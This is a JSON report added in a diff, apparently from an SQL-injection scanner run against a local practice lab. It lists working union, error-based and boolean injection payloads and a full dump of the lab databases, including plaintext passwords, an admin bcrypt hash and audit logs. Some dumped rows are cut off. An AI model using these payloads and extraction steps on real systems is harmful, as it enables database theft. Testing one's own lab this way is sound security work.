@@ -1,0 +1,1101 @@
+{
+  "scanId": "Vwbm6PV1OqIR",
+  "target": {
+    "id": "jKhgf351do",
+    "mode": "http",
+    "baseUrl": "http://127.0.0.1:8178/num?id=1",
+    "method": "GET",
+    "bodyParams": {},
+    "jsonBody": null,
+    "cookieParams": {},
+    "headerParams": {},
+    "config": {
+      "port": 4567,
+      "timeoutMs": 15000,
+      "retry": 0,
+      "disableKeepAlive": false,
+      "http2": false,
+      "ratePerSec": 50,
+      "concurrency": 4,
+      "sessionDefault": false,
+      "level": 2,
+      "risk": 2,
+      "productionMode": true,
+      "confirmDestructive": false,
+      "testFilter": "",
+      "testSkip": "",
+      "useRegistry": false,
+      "prefix": "",
+      "suffix": "",
+      "boolStableDiff": true,
+      "boolStableDiffSamples": 3,
+      "timeThresholdMs": 1500,
+      "timeBlindSamples": 5,
+      "timeBlindSleepSec": 2,
+      "timeBlindCalibrate": false,
+      "timeBlindCalibrateMin": 1,
+      "timeProbeSleepSec": null,
+      "timeExtractSleepSec": null,
+      "maxColumnsGuess": 50,
+      "matchString": null,
+      "notString": null,
+      "matchText": false,
+      "matchCode": null,
+      "matchRegexp": null,
+      "trueRegexp": null,
+      "falseRegexp": null,
+      "matchTitle": false,
+      "autoDynamicBlock": true,
+      "prefilter": true,
+      "skipStatic": false,
+      "validationSkip": true,
+      "pocRedactAuth": false,
+      "scope": [],
+      "prefilterSinglePoint": false,
+      "invalidValue": null,
+      "knownPoint": null,
+      "enableExtract": true,
+      "excludeSysdbs": true,
+      "dumpRowLimit": 20,
+      "dumpStart": 0,
+      "dumpStop": 0,
+      "safeUrl": "",
+      "safeFreq": 0,
+      "extractConcurrency": 4,
+      "dumpConcurrency": 4,
+      "dumpDatabaseConcurrency": 2,
+      "predictOutput": true,
+      "wafEvasion": {
+        "randomUA": false,
+        "jitterMs": 0,
+        "obfuscate": false,
+        "tamper": {
+          "enabled": false,
+          "plugins": [],
+          "intensity": "medium"
+        },
+        "adaptiveOnBlock": true,
+        "filterAdaptive": true,
+        "autoRetry": false
+      },
+      "oob": {
+        "enabled": false,
+        "callbackBase": "127.0.0.1:8899",
+        "httpPort": 8899,
+        "timeoutMs": 5000,
+        "dnsOob": false,
+        "dnsDomain": "",
+        "dnsPort": 53
+      },
+      "techniques": [
+        "union",
+        "error",
+        "boolean",
+        "time"
+      ],
+      "crawlForms": false,
+      "crawlDepth": 0,
+      "proxy": null,
+      "auth": null,
+      "dbms": null,
+      "insecureTls": false,
+      "trustProxyEnv": true,
+      "proxyBypassLocal": true,
+      "ssrfViaProxy": "auto",
+      "secondOrder": {
+        "enabled": false,
+        "triggerUrls": [],
+        "refreshCsrf": true,
+        "negativeControl": true,
+        "oobTrigger": false,
+        "secondUrl": "",
+        "secondMethod": "GET",
+        "secondData": null,
+        "triggerMethod": "GET",
+        "allowWrites": false
+      },
+      "nullConnection": false,
+      "delay": 0,
+      "reqRate": 0,
+      "maxReq": 0,
+      "forceSsl": false,
+      "ignoreRedirects": false,
+      "hpp": false,
+      "parseErrors": false,
+      "freshQueries": false,
+      "activeWafProbe": false,
+      "blindRobust": {
+        "enabled": true,
+        "booleanSamples": 3,
+        "baselineSamples": 5,
+        "timeConfidenceZ": 2,
+        "minStableRatio": 0.66,
+        "booleanSignificanceZ": 1.645,
+        "adaptive": true,
+        "adaptiveHeadroom": 0.3,
+        "minStableRatioFloor": 0.66,
+        "minStableRatioCap": 0.95,
+        "adaptiveTimeFloorScale": 2,
+        "concurrency": 4,
+        "extractVerify": true
+      }
+    }
+  },
+  "startedAt": "2026-09-11T18:17:07.013Z",
+  "finishedAt": "2026-09-11T18:17:08.402Z",
+  "dbms": "MySQL",
+  "points": [
+    {
+      "id": "283e732d",
+      "location": "url",
+      "param": "id",
+      "originalValue": "1",
+      "confirmed": true,
+      "technique": "boolean",
+      "dbms": "MySQL",
+      "formMethod": null,
+      "actionUrl": null,
+      "formValues": null,
+      "csrfTokenName": null,
+      "isStorePoint": false,
+      "storeKind": null,
+      "boundaryProbed": true,
+      "_baselineTitle": "User Detail",
+      "boundary": "",
+      "dbmsVersion": {
+        "raw": "8.0.28",
+        "major": 8,
+        "minor": 0
+      },
+      "echoCols": [
+        0,
+        1,
+        2,
+        3,
+        4
+      ],
+      "columns": 5
+    }
+  ],
+  "vulns": [
+    {
+      "id": "M18HuAP9",
+      "pointId": "283e732d",
+      "technique": "union",
+      "dbms": "MySQL",
+      "riskLevel": "High",
+      "payloads": [
+        "1 UNION SELECT 'SQLISCANNER0','SQLISCANNER1','SQLISCANNER2','SQLISCANNER3','SQLISCANNER4'-- -",
+        "1 ORDER BY 5-- -"
+      ],
+      "description": "UNION 注入成功，回显列：0,1,2,3,4（列数 5）",
+      "evidence": "UNION 注入成功，回显列：0,1,2,3,4（列数 5）",
+      "trace": null
+    },
+    {
+      "id": "1eN0jhaz",
+      "pointId": "283e732d",
+      "technique": "error",
+      "dbms": "MySQL",
+      "riskLevel": "High",
+      "payloads": [
+        "1' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -"
+      ],
+      "description": "数据库报错回显：SQL syntax（识别为 MySQL）",
+      "evidence": "数据库报错回显：SQL syntax（识别为 MySQL）",
+      "trace": null
+    },
+    {
+      "id": "uUsaXJLN",
+      "pointId": "283e732d",
+      "technique": "boolean",
+      "dbms": "MySQL",
+      "riskLevel": "Medium",
+      "payloads": [
+        "1 AND 1=1",
+        "1 AND 1=2"
+      ],
+      "description": "布尔注入确认(统计·自适应): 真≈基线1.00、假≠基线1.00、差异1.00、基线噪声0.00、门槛0.66、z=2.83(显著)",
+      "evidence": "布尔注入确认(统计·自适应): 真≈基线1.00、假≠基线1.00、差异1.00、基线噪声0.00、门槛0.66、z=2.83(显著)",
+      "trace": {
+        "technique": "boolean",
+        "adaptive": true,
+        "baselineNoiseRate": 0,
+        "minStable": 0.66,
+        "baselineSamples": [
+          {
+            "idx": 0,
+            "len": 317,
+            "likeBaseline": true,
+            "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>User Detail</title></head><body><h1>User Detail</h1><table border=\"1\"><tr><th>id</th><th>username</th><t"
+          },
+          {
+            "idx": 1,
+            "len": 317,
+            "likeBaseline": true,
+            "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>User Detail</title></head><body><h1>User Detail</h1><table border=\"1\"><tr><th>id</th><th>username</th><t"
+          },
+          {
+            "idx": 2,
+            "len": 317,
+            "likeBaseline": true,
+            "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>User Detail</title></head><body><h1>User Detail</h1><table border=\"1\"><tr><th>id</th><th>username</th><t"
+          },
+          {
+            "idx": 3,
+            "len": 317,
+            "likeBaseline": true,
+            "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>User Detail</title></head><body><h1>User Detail</h1><table border=\"1\"><tr><th>id</th><th>username</th><t"
+          },
+          {
+            "idx": 4,
+            "len": 317,
+            "likeBaseline": true,
+            "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>User Detail</title></head><body><h1>User Detail</h1><table border=\"1\"><tr><th>id</th><th>username</th><t"
+          }
+        ],
+        "pairs": [
+          {
+            "ti": 0,
+            "fi": 2,
+            "trueSamples": [
+              {
+                "idx": 0,
+                "len": 267,
+                "likeBaseline": false,
+                "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Error</title></head><body><h1>Error</h1><pre>You have an error in your SQL syntax; check the manual that"
+              },
+              {
+                "idx": 1,
+                "len": 267,
+                "likeBaseline": false,
+                "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Error</title></head><body><h1>Error</h1><pre>You have an error in your SQL syntax; check the manual that"
+              },
+              {
+                "idx": 2,
+                "len": 267,
+                "likeBaseline": false,
+                "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Error</title></head><body><h1>Error</h1><pre>You have an error in your SQL syntax; check the manual that"
+              }
+            ],
+            "falseSamples": [
+              {
+                "idx": 0,
+                "len": 267,
+                "likeBaseline": false,
+                "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Error</title></head><body><h1>Error</h1><pre>You have an error in your SQL syntax; check the manual that"
+              },
+              {
+                "idx": 1,
+                "len": 267,
+                "likeBaseline": false,
+                "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Error</title></head><body><h1>Error</h1><pre>You have an error in your SQL syntax; check the manual that"
+              },
+              {
+                "idx": 2,
+                "len": 267,
+                "likeBaseline": false,
+                "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Error</title></head><body><h1>Error</h1><pre>You have an error in your SQL syntax; check the manual that"
+              }
+            ],
+            "trueRatio": 0,
+            "falseRatio": 1,
+            "meaningfulRatio": 0,
+            "z": 2.82842712474619,
+            "significant": true,
+            "diffs": [
+              {
+                "idx": 0,
+                "lenDelta": 0,
+                "firstDiffOffset": -1,
+                "changedSnippet": ""
+              },
+              {
+                "idx": 1,
+                "lenDelta": 0,
+                "firstDiffOffset": -1,
+                "changedSnippet": ""
+              },
+              {
+                "idx": 2,
+                "lenDelta": 0,
+                "firstDiffOffset": -1,
+                "changedSnippet": ""
+              }
+            ]
+          },
+          {
+            "ti": 1,
+            "fi": 3,
+            "trueSamples": [
+              {
+                "idx": 0,
+                "len": 267,
+                "likeBaseline": false,
+                "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Error</title></head><body><h1>Error</h1><pre>You have an error in your SQL syntax; check the manual that"
+              },
+              {
+                "idx": 1,
+                "len": 267,
+                "likeBaseline": false,
+                "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Error</title></head><body><h1>Error</h1><pre>You have an error in your SQL syntax; check the manual that"
+              },
+              {
+                "idx": 2,
+                "len": 267,
+                "likeBaseline": false,
+                "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Error</title></head><body><h1>Error</h1><pre>You have an error in your SQL syntax; check the manual that"
+              }
+            ],
+            "falseSamples": [
+              {
+                "idx": 0,
+                "len": 267,
+                "likeBaseline": false,
+                "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Error</title></head><body><h1>Error</h1><pre>You have an error in your SQL syntax; check the manual that"
+              },
+              {
+                "idx": 1,
+                "len": 267,
+                "likeBaseline": false,
+                "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Error</title></head><body><h1>Error</h1><pre>You have an error in your SQL syntax; check the manual that"
+              },
+              {
+                "idx": 2,
+                "len": 267,
+                "likeBaseline": false,
+                "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>Error</title></head><body><h1>Error</h1><pre>You have an error in your SQL syntax; check the manual that"
+              }
+            ],
+            "trueRatio": 0,
+            "falseRatio": 1,
+            "meaningfulRatio": 0,
+            "z": 2.82842712474619,
+            "significant": true,
+            "diffs": [
+              {
+                "idx": 0,
+                "lenDelta": 0,
+                "firstDiffOffset": -1,
+                "changedSnippet": ""
+              },
+              {
+                "idx": 1,
+                "lenDelta": 0,
+                "firstDiffOffset": -1,
+                "changedSnippet": ""
+              },
+              {
+                "idx": 2,
+                "lenDelta": 0,
+                "firstDiffOffset": -1,
+                "changedSnippet": ""
+              }
+            ]
+          },
+          {
+            "ti": 4,
+            "fi": 5,
+            "trueSamples": [
+              {
+                "idx": 0,
+                "len": 317,
+                "likeBaseline": true,
+                "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>User Detail</title></head><body><h1>User Detail</h1><table border=\"1\"><tr><th>id</th><th>username</th><t"
+              },
+              {
+                "idx": 1,
+                "len": 317,
+                "likeBaseline": true,
+                "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>User Detail</title></head><body><h1>User Detail</h1><table border=\"1\"><tr><th>id</th><th>username</th><t"
+              },
+              {
+                "idx": 2,
+                "len": 317,
+                "likeBaseline": true,
+                "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>User Detail</title></head><body><h1>User Detail</h1><table border=\"1\"><tr><th>id</th><th>username</th><t"
+              }
+            ],
+            "falseSamples": [
+              {
+                "idx": 0,
+                "len": 146,
+                "likeBaseline": false,
+                "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>User Detail</title></head><body><h1>User Detail</h1><p>No results found.</p></body></html>"
+              },
+              {
+                "idx": 1,
+                "len": 146,
+                "likeBaseline": false,
+                "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>User Detail</title></head><body><h1>User Detail</h1><p>No results found.</p></body></html>"
+              },
+              {
+                "idx": 2,
+                "len": 146,
+                "likeBaseline": false,
+                "excerpt": "<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title>User Detail</title></head><body><h1>User Detail</h1><p>No results found.</p></body></html>"
+              }
+            ],
+            "trueRatio": 1,
+            "falseRatio": 1,
+            "meaningfulRatio": 1,
+            "z": 2.82842712474619,
+            "significant": true,
+            "diffs": [
+              {
+                "idx": 0,
+                "lenDelta": -171,
+                "firstDiffOffset": 109,
+                "changedSnippet": "h1>User Detail</h1><p>No results found.</p></body></html>"
+              },
+              {
+                "idx": 1,
+                "lenDelta": -171,
+                "firstDiffOffset": 109,
+                "changedSnippet": "h1>User Detail</h1><p>No results found.</p></body></html>"
+              },
+              {
+                "idx": 2,
+                "lenDelta": -171,
+                "firstDiffOffset": 109,
+                "changedSnippet": "h1>User Detail</h1><p>No results found.</p></body></html>"
+              }
+            ]
+          }
+        ],
+        "decision": "vulnerable"
+      }
+    }
+  ],
+  "data": {
+    "databases": [
+      "netsec",
+      "sqli_lab",
+      "sqli_test"
+    ],
+    "tables": {
+      "sqli_lab": [
+        "products",
+        "users"
+      ],
+      "sqli_test": [
+        "users"
+      ],
+      "netsec": [
+        "alerts",
+        "assets",
+        "audit_logs",
+        "cron_tasks",
+        "export_logs",
+        "schema_migrations",
+        "users",
+        "vulnerabilities"
+      ]
+    },
+    "columns": {
+      "sqli_lab.products": [
+        "id:int",
+        "title:varchar",
+        "price:decimal",
+        "category:varchar"
+      ],
+      "sqli_lab.users": [
+        "id:int",
+        "username:varchar",
+        "password:varchar",
+        "email:varchar",
+        "is_admin:tinyint"
+      ],
+      "sqli_test.users": [
+        "id:int",
+        "name:varchar",
+        "email:varchar",
+        "password:varchar"
+      ],
+      "netsec.alerts": [
+        "id:int",
+        "asset_id:int",
+        "vuln_id:int",
+        "title:varchar",
+        "severity:enum",
+        "status:enum",
+        "disposition:text",
+        "created_at:datetime",
+        "updated_at:datetime"
+      ],
+      "netsec.assets": [
+        "id:int",
+        "ip:varchar",
+        "domain:varchar",
+        "hostname:varchar",
+        "ports:json",
+        "os:varchar",
+        "owner:varchar",
+        "tags:json",
+        "source:varchar",
+        "last_scan_at:datetime",
+        "created_at:datetime",
+        "updated_at:datetime"
+      ],
+      "netsec.audit_logs": [
+        "id:int",
+        "user_id:int",
+        "username:varchar",
+        "action:varchar",
+        "target_type:varchar",
+        "target_id:int",
+        "detail:json",
+        "ip:varchar",
+        "created_at:datetime",
+        "prev_hash:varchar",
+        "record_hash:varchar",
+        "key_version:int"
+      ],
+      "netsec.cron_tasks": [
+        "id:int",
+        "name:varchar",
+        "type:varchar",
+        "target_scope:json",
+        "cron_expr:varchar",
+        "enabled:tinyint",
+        "last_run_at:datetime",
+        "next_run_at:datetime",
+        "created_by:int",
+        "created_at:datetime",
+        "updated_at:datetime"
+      ],
+      "netsec.export_logs": [
+        "id:int",
+        "user_id:int",
+        "username:varchar",
+        "export_type:varchar",
+        "target_id:int",
+        "status:enum",
+        "file_size:bigint",
+        "detail:json",
+        "created_at:datetime",
+        "updated_at:datetime"
+      ],
+      "netsec.schema_migrations": [
+        "name:varchar",
+        "applied_at:datetime"
+      ],
+      "netsec.users": [
+        "id:int",
+        "username:varchar",
+        "password_hash:varchar",
+        "role:enum",
+        "display_name:varchar",
+        "created_at:datetime",
+        "updated_at:datetime"
+      ],
+      "netsec.vulnerabilities": [
+        "id:int",
+        "asset_id:int",
+        "name:varchar",
+        "cve:varchar",
+        "severity:enum",
+        "cvss:decimal",
+        "category:varchar",
+        "evidence:text",
+        "description:text",
+        "recommendation:text",
+        "status:enum",
+        "detected_at:datetime",
+        "created_at:datetime",
+        "updated_at:datetime"
+      ]
+    },
+    "rows": {
+      "sqli_lab.products": [
+        {
+          "id": "1",
+          "title": "Mechanical Keyboard",
+          "price": "329.00",
+          "category": "digital"
+        },
+        {
+          "id": "2",
+          "title": "Ergonomic Chair",
+          "price": "699.00",
+          "category": "furniture"
+        },
+        {
+          "id": "3",
+          "title": "4K Monitor",
+          "price": "1899.00",
+          "category": "digital"
+        },
+        {
+          "id": "4",
+          "title": "Desk Lamp",
+          "price": "129.00",
+          "category": "furniture"
+        }
+      ],
+      "sqli_lab.users": [
+        {
+          "id": "1",
+          "username": "admin",
+          "password": "admin123",
+          "email": "admin@lab.local",
+          "is_admin": "1"
+        },
+        {
+          "id": "2",
+          "username": "bob",
+          "password": "bob456",
+          "email": "bob@lab.local",
+          "is_admin": "0"
+        },
+        {
+          "id": "3",
+          "username": "alice",
+          "password": "alice789",
+          "email": "alice@lab.local",
+          "is_admin": "0"
+        },
+        {
+          "id": "4",
+          "username": "test",
+          "password": "test@123",
+          "email": "test@lab.local",
+          "is_admin": "0"
+        },
+        {
+          "id": "5",
+          "username": "guest",
+          "password": "guest123",
+          "email": "guest@lab.local",
+          "is_admin": "0"
+        }
+      ],
+      "sqli_test.users": [
+        {
+          "id": "1",
+          "name": "alice",
+          "email": "alice@example.com",
+          "password": "pass123"
+        },
+        {
+          "id": "2",
+          "name": "bob",
+          "email": "bob@example.com",
+          "password": "secret456"
+        },
+        {
+          "id": "3",
+          "name": "张三",
+          "email": "zhangsan@example.com",
+          "password": "p@ss789"
+        }
+      ],
+      "netsec.alerts": [
+        {
+          "id": "4",
+          "asset_id": "1",
+          "vuln_id": "11",
+          "title": "127.0.0.1 - MySQL 弱口令/暴露风险",
+          "severity": "medium",
+          "status": "pending",
+          "disposition": "",
+          "created_at": "2026-08-16 10:09:05",
+          "updated_at": "2026-08-16 10:09:05"
+        },
+        {
+          "id": "5",
+          "asset_id": "1",
+          "vuln_id": "12",
+          "title": "127.0.0.1 - SMB 服务暴露（EternalBlue 风险）",
+          "severity": "high",
+          "status": "pending",
+          "disposition": "",
+          "created_at": "2026-08-16 10:09:05",
+          "updated_at": "2026-08-16 10:09:05"
+        },
+        {
+          "id": "6",
+          "asset_id": "2",
+          "vuln_id": "13",
+          "title": "127.0.0.2 - MySQL 弱口令/暴露风险",
+          "severity": "medium",
+          "status": "pending",
+          "disposition": "",
+          "created_at": "2026-08-16 10:09:05",
+          "updated_at": "2026-08-16 10:09:05"
+        },
+        {
+          "id": "7",
+          "asset_id": "2",
+          "vuln_id": "14",
+          "title": "127.0.0.2 - SMB 服务暴露（EternalBlue 风险）",
+          "severity": "high",
+          "status": "pending",
+          "disposition": "",
+          "created_at": "2026-08-16 10:09:05",
+          "updated_at": "2026-08-16 10:09:05"
+        },
+        {
+          "id": "8",
+          "asset_id": "3",
+          "vuln_id": "15",
+          "title": "127.0.0.3 - MySQL 弱口令/暴露风险",
+          "severity": "medium",
+          "status": "pending",
+          "disposition": "",
+          "created_at": "2026-08-16 10:09:05",
+          "updated_at": "2026-08-16 10:09:05"
+        },
+        {
+          "id": "9",
+          "asset_id": "3",
+          "vuln_id": "16",
+          "title": "127.0.0.3 - SMB 服务暴露（EternalBlue 风险）",
+          "severity": "high",
+          "status": "pending",
+          "disposition": "",
+          "created_at": "2026-08-16 10:09:05",
+          "updated_at": "2026-08-16 10:09:05"
+        },
+        {
+          "id": "10",
+          "asset_id": "4",
+          "vuln_id": "17",
+          "title": "127.0.0.4 - MySQL 弱口令/暴露风险",
+          "severity": "medium",
+          "status": "pending",
+          "disposition": "",
+          "created_at": "2026-08-16 10:09:05",
+          "updated_at": "2026-08-16 10:09:05"
+        },
+        {
+          "id": "11",
+          "asset_id": "4",
+          "vuln_id": "18",
+          "title": "127.0.0.4 - SMB 服务暴露（EternalBlue 风险）",
+          "severity": "high",
+          "status": "pending",
+          "disposition": "",
+          "created_at": "2026-08-16 10:09:05",
+          "updated_at": "2026-08-16 10:09:05"
+        },
+        {
+          "id": "12",
+          "asset_id": "5",
+          "vuln_id": "19",
+          "title": "127.0.0.5 - MySQL 弱口令/暴露风险",
+          "severity": "medium",
+          "status": "pending",
+          "disposition": "",
+          "created_at": "2026-08-16 10:09:05",
+          "updated_at": "2026-08-16 10:09:05"
+        },
+        {
+          "id": "13",
+          "asset_id": "5",
+          "vuln_id": "20",
+          "title": "127.0.0.5 - SMB 服务暴露（Eterna",
+          "severity": null,
+          "status": null,
+          "disposition": null,
+          "created_at": null,
+          "updated_at": null
+        }
+      ],
+      "netsec.assets": [
+        {
+          "id": "1",
+          "ip": "127.0.0.1",
+          "domain": "web.internal",
+          "hostname": "web-01",
+          "ports": "[{\"port\": 135, \"banner\": \"\", \"service\": \"msrpc\", \"version\": \"\"}, {\"port\": 445, \"banner\": \"\", \"service\": \"microsoft-ds\", \"version\": \"\"}, {\"port\": 3306, \"banner\": \"J\\u0000\\u0000\\u0000\\n8.0.28\\u0000\\u001d\\u0000\\u0000\\u0000zFYcl:)<\\u0000���\\u0002\\u0000��\\u0015\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000Ohw`\\t\\u0004v\\u00035k\\u0005\\u0000caching_sha2_password\\u0000\", \"service\": \"mysql\", \"version\": \"\"}]",
+          "os": "Linux",
+          "owner": "运维组",
+          "tags": "[\"web\", \"production\"]",
+          "source": "manual",
+          "last_scan_at": "2026-08-16 10:09:05",
+          "created_at": "2026-08-16 18:07:49",
+          "updated_at": "2026-08-16 10:09:05"
+        },
+        {
+          "id": "2",
+          "ip": "127.0.0.2",
+          "domain": "db.internal",
+          "hostname": "db-01",
+          "ports": "[{\"port\": 135, \"banner\": \"\", \"service\": \"msrpc\", \"version\": \"\"}, {\"port\": 445, \"banner\": \"\", \"service\": \"microsoft-ds\", \"version\": \"\"}, {\"port\": 3306, \"banner\": \"J\\u0000\\u0000\\u0000\\n8.0.28\\u0000\\u001e\\u0000\\u0000\\u0000!\\\"xa)ILz\\u0000���\\u0002\\u0000��\\u0015\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u0000\\u00006=@\\u001bom\\t#\\u0006C\\u0007y\\u0000caching_sha2_password\\u0000\", \"service\": \"mysql\", \"version\": \"\"}]",
+          "os": "Linu",
+          "owner": null,
+          "tags": null,
+          "source": null,
+          "last_scan_at": null,
+          "created_at": null,
+          "updated_at": null
+        }
+      ],
+      "netsec.cron_tasks": [],
+      "netsec.export_logs": [
+        {
+          "id": "1",
+          "user_id": "1",
+          "username": "admin",
+          "export_type": "excel",
+          "target_id": "",
+          "status": "done",
+          "file_size": "",
+          "detail": "{\"vulns\": 12, \"alerts\": 12, \"assets\": 6}",
+          "created_at": "2026-08-16 10:09:21",
+          "updated_at": "2026-08-16 10:09:21"
+        }
+      ],
+      "netsec.schema_migrations": [
+        {
+          "name": "01_add_audit_chain.sql",
+          "applied_at": "2026-08-16 18:07:49"
+        },
+        {
+          "name": "02_add_key_version.sql",
+          "applied_at": "2026-08-16 18:07:49"
+        }
+      ],
+      "netsec.users": [
+        {
+          "id": "1",
+          "username": "admin",
+          "password_hash": "$2a$10$52AdU8TNWZn/50Y2wwjffuASk58Ntd4Ig/Gp9r9RqFAfLIOI6/u9u",
+          "role": "admin",
+          "display_name": "系统管理员",
+          "created_at": "2026-08-16 18:07:49",
+          "updated_at": "2026-08-16 18:07:49"
+        }
+      ],
+      "netsec.vulnerabilities": [
+        {
+          "id": "11",
+          "asset_id": "1",
+          "name": "MySQL 弱口令/暴露风险",
+          "cve": "N/A",
+          "severity": "medium",
+          "cvss": "5.6",
+          "category": "弱口令风险",
+          "evidence": "端口 3306/mysql 开放，存在弱口令与暴露风险",
+          "description": "MySQL(3306) 公网暴露或存在弱口令时，攻击者可拖库。本平台仅做风险识别，不实际爆破。",
+          "recommendation": "禁止 MySQL 公网暴露，设置强口令，启用访问白名单。",
+          "status": "open",
+          "detected_at": "2026-08-16 10:09:05",
+          "created_at": "2026-08-16 10:09:05",
+          "updated_at": "2026-08-16 10:09:05"
+        },
+        {
+          "id": "12",
+          "asset_id": "1",
+          "name": "SMB 服务暴露（EternalBlue 风险）",
+          "cve": "CVE-2017-0144",
+          "severity": "high",
+          "cvss": "8.1",
+          "category": "已知漏洞",
+          "evidence": "端口 445/microsoft-ds 开放，存在 EternalBlue 类风险",
+          "description": "SMB(445) 暴露且未打补丁时存在 EternalBlue（CVE-2017-0144）远程代码执行风险。",
+          "recommendation": "安装 MS17-010 补丁，关闭不必要 SMB，使用防火墙隔离。",
+          "status": "open",
+          "detected_at": "2026-08-16 10:09:05",
+          "created_at": "2026-08-16 10:09:05",
+          "updated_at": "2026-08-16 10:09:05"
+        },
+        {
+          "id": "13",
+          "asset_id": "2",
+          "name": "MySQL 弱口令/暴露风险",
+          "cve": "N/A",
+          "severity": "medium",
+          "cvss": "5.6",
+          "category": "弱口令风险",
+          "evidence": "端口 3306/mysql 开放，存在弱口令与暴露风险",
+          "description": "MySQL(3306) 公网暴露或存在弱口令时，攻击者可拖库。本平台仅做风险识别，不实际爆破。",
+          "recommendation": "禁止 MySQL 公网暴露",
+          "status": null,
+          "detected_at": null,
+          "created_at": null,
+          "updated_at": null
+        }
+      ],
+      "netsec.audit_logs": [
+        {
+          "id": "1",
+          "user_id": "",
+          "username": "admin",
+          "action": "LOGIN",
+          "target_type": "",
+          "target_id": "",
+          "detail": "",
+          "ip": "::1",
+          "created_at": "2026-08-16 10:08:27",
+          "prev_hash": "",
+          "record_hash": "afb402fc1ba89eb2e763308ac980ec45af489ced0137c92973e5f0d34fb635c0",
+          "key_version": "1"
+        },
+        {
+          "id": "2",
+          "user_id": "",
+          "username": "admin",
+          "action": "LOGIN",
+          "target_type": "",
+          "target_id": "",
+          "detail": "",
+          "ip": "::1",
+          "created_at": "2026-08-16 10:08:27",
+          "prev_hash": "afb402fc1ba89eb2e763308ac980ec45af489ced0137c92973e5f0d34fb635c0",
+          "record_hash": "dbe47001216547c98681ab3eac3b05c572a2041f173e6d9d6da28a5336d1f312",
+          "key_version": "1"
+        },
+        {
+          "id": "3",
+          "user_id": "",
+          "username": "admin",
+          "action": "LOGIN",
+          "target_type": "",
+          "target_id": "",
+          "detail": "",
+          "ip": "::1",
+          "created_at": "2026-08-16 10:09:00",
+          "prev_hash": "dbe47001216547c98681ab3eac3b05c572a2041f173e6d9d6da28a5336d1f312",
+          "record_hash": "ed37c4a933fcf1097949933b1b909733acd61b1124218651ec9e7160ec6376e7",
+          "key_version": "1"
+        },
+        {
+          "id": "4",
+          "user_id": "1",
+          "username": "admin",
+          "action": "SCAN_TRIGGER",
+          "target_type": "",
+          "target_id": "",
+          "detail": "",
+          "ip": "::1",
+          "created_at": "2026-08-16 10:09:05",
+          "prev_hash": "ed37c4a933fcf1097949933b1b909733acd61b1124218651ec9e7160ec6376e7",
+          "record_hash": "1816e5302911871f3e9996d7ab456f829860066c2850e635b97a00091421756d",
+          "key_version": "1"
+        },
+        {
+          "id": "5",
+          "user_id": "",
+          "username": "admin",
+          "action": "LOGIN",
+          "target_type": "",
+          "target_id": "",
+          "detail": "",
+          "ip": "::1",
+          "created_at": "2026-08-16 10:09:21",
+          "prev_hash": "1816e5302911871f3e9996d7ab456f829860066c2850e635b97a00091421756d",
+          "record_hash": "f6949321d4d674d9b0ccacbc1f5130394d638e8da2b38aec963a39f1ab9952dd",
+          "key_version": "1"
+        },
+        {
+          "id": "6",
+          "user_id": "1",
+          "username": "admin",
+          "action": "REPORT_EXPORT",
+          "target_type": "report",
+          "target_id": "",
+          "detail": "",
+          "ip": "::1",
+          "created_at": "2026-08-16 10:09:21",
+          "prev_hash": "f6949321d4d674d9b0ccacbc1f5130394d638e8da2b38aec963a39f1ab9952dd",
+          "record_hash": "3d0deef01358c40c5e25070804998189b1ed6352b8d21dac5d2ade4714485703",
+          "key_version": "1"
+        },
+        {
+          "id": "7",
+          "user_id": "",
+          "username": "admin",
+          "action": "LOGIN",
+          "target_type": "",
+          "target_id": "",
+          "detail": "",
+          "ip": "::1",
+          "created_at": "2026-08-16 10:10:45",
+          "prev_hash": "3d0deef01358c40c5e25070804998189b1ed6352b8d21dac5d2ade4714485703",
+          "record_hash": "3bfbc5f171ab81e22d8fbe263f1e6594f569a62ef40c62557beaef987e507289",
+          "key_version": "1"
+        },
+        {
+          "id": "8",
+          "user_id": "",
+          "username": "admin",
+          "action": "LOGIN",
+          "target_type": "",
+          "target_id": "",
+          "detail": "",
+          "ip": "::1",
+          "created_at": "2026-08-16 12:26:53",
+          "prev_hash": "3bfbc5f171ab81e22d8fbe263f1e6594f569a62ef40c62557beaef987e507289",
+          "record_hash": "9c659d0e98177472b4aee1b039cc70dd78855366cbc2214b923e700012e3b4da",
+          "key_version": "1"
+        }
+      ]
+    },
+    "schemas": {},
+    "counts": {}
+  },
+  "riskLevel": "Critical",
+  "summary": {
+    "constraints": [
+      "本次开启拖库（enableExtract）：提取阶段会向目标发出大量读请求（受限速与行数上限约束）。生产环境建议控制行数并避开业务高峰"
+    ],
+    "stackedEnabled": false,
+    "stackedCorroborations": [],
+    "validity": {
+      "status": "ok",
+      "reliable": true,
+      "reason": "目标可达性与会话状态正常：累计 118 次请求，无连续失败/拦截/会话失效/持续 5xx 迹象",
+      "counts": {
+        "total": 118,
+        "failStreak": 0,
+        "blockHits": 0,
